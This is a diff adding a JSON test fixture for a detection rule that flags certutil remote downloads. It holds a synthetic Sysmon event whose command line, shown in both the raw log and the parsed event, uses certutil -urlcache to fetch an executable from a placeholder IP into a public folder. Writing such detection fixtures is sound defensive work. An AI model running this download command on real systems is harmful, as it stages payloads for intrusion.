@@ -1,0 +1,55 @@
+{
+  "description": "certutil downloads a remote file with -urlcache.",
+  "log_type": "WINDOWS_SYSMON",
+  "parser": {
+    "name": "WINDOWS_SYSMON",
+    "version": "unknown"
+  },
+  "rule": "win_certutil_remote_download",
+  "expect": "fire",
+  "verified_against_tenant": false,
+  "notes": "Synthetic event built from public schema docs. Not yet confirmed against a live parser.",
+  "raw_logs": [
+    {
+      "EventID": 1,
+      "UtcTime": "2026-10-21T16:45:02Z",
+      "Computer": "ws-0001.corp.example.com",
+      "User": "EXAMPLE\\jdoe",
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.10/a.exe C:\\Users\\Public\\a.exe",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "ProcessGuid": "{00000000-0000-0000-0000-000000000010}"
+    }
+  ],
+  "udm_events": [
+    {
+      "metadata": {
+        "event_timestamp": "2026-10-21T16:45:02Z",
+        "event_type": "PROCESS_LAUNCH",
+        "log_type": "WINDOWS_SYSMON",
+        "product_event_type": "1",
+        "product_name": "Microsoft-Windows-Sysmon",
+        "id": "fixture-10"
+      },
+      "principal": {
+        "hostname": "ws-0001.corp.example.com",
+        "user": {
+          "userid": "jdoe"
+        },
+        "process": {
+          "file": {
+            "full_path": "C:\\Windows\\System32\\cmd.exe"
+          }
+        }
+      },
+      "target": {
+        "process": {
+          "file": {
+            "full_path": "C:\\Windows\\System32\\certutil.exe"
+          },
+          "command_line": "certutil.exe -urlcache -split -f http://203.0.113.10/a.exe C:\\Users\\Public\\a.exe"
+        }
+      }
+    }
+  ]
+}
